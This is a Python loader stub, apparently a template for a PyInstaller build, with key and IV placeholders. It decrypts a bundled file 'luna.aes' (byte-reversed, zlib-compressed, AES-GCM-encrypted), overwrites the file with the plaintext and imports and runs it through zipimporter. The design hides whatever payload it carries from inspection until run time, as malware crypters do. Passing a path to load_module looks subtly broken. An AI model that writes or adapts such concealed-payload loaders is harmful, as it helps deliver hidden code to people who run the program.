import base64
import os
import sys
import zlib
from pyaes import AESModeOfOperationGCM
from zipimport import zipimporter
def get_absolute_path(relative_path):
    if getattr(sys, 'frozen', False):
        current_dir = sys._MEIPASS
    else:
        current_dir = os.path.dirname(__file__)
    return os.path.join(current_dir, relative_path)

zipfile = os.path.join(sys._MEIPASS, "luna.aes")
module = get_absolute_path("luna-o")

key = base64.b64decode("%key%")
iv = base64.b64decode("%iv%")

def decrypt(key, iv, ciphertext):
    return AESModeOfOperationGCM(key, iv).decrypt(ciphertext)

if os.path.isfile(zipfile):
    with open(zipfile, "rb") as f:
        ciphertext = f.read()
    ciphertext = zlib.decompress(ciphertext[::-1])
    decrypted = decrypt(key, iv, ciphertext)
    with open(zipfile, "wb") as f:
        f.write(decrypted)
    
    zipimporter(zipfile).load_module(module)
